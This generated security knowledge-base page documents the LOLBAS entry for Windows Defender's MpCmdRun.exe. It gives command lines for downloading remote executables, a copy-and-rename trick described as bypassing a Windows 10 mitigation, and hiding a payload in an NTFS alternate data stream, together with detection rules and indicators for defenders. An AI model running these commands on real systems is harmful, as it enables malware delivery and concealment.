---
title: "MpCmdRun.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/MpCmdRun.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "MpCmdRun.exe"
functions:
  - "Download"
  - "ADS"
attack_technique_ids:
  - "T1105"
  - "T1564.004"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Binary part of Windows Defender. Used to manage settings in Windows Defender

## Paths

- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe`
- `C:\Program Files\Windows Defender\MpCmdRun.exe`
- `C:\Program Files (x86)\Windows Defender\MpCmdRun.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\X86\MpCmdRun.exe`

## Commands

### 1. Download

Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)

```cmd
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
```

- Use Case: Download file
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 2. Download

Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.

```cmd
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
```

- Use Case: Download file
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 3. ADS

Download file to machine and store it in Alternate Data Stream

```cmd
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
```

- Use Case: Hide downloaded data into an Alternate Data Stream
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
- Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
- IOC: MpCmdRun storing data into alternate data streams.
- IOC: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
- IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
- IOC: User Agent is "MpCommunication"

## Resources

- {'Link': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus'}
- {'Link': 'https://twitter.com/mohammadaskar2/status/1301263551638761477'}
- {'Link': 'https://twitter.com/Oddvarmoe/status/1301444858910052352'}
- {'Link': 'https://twitter.com/NotMedic/status/1301506813242867720'}

## Acknowledgements

- {'Person': 'Askar', 'Handle': '@mohammadaskar2'}
- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}
- {'Person': 'RichRumble'}
- {'Person': 'Cedric', 'Handle': '@th3c3dr1c'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml)
